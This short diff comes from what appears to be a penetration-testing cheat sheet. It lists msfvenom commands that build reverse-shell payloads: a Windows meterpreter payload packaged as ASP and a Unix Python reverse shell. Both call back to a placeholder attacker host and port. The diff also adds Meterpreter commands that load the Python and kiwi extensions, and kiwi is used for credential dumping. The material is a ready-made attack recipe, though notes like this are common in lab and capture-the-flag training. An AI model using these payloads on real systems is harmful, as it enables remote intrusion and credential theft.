@@ -29,3 +29,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > 
 # Python
 
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+
+# load
+
+load python
+load kiwi
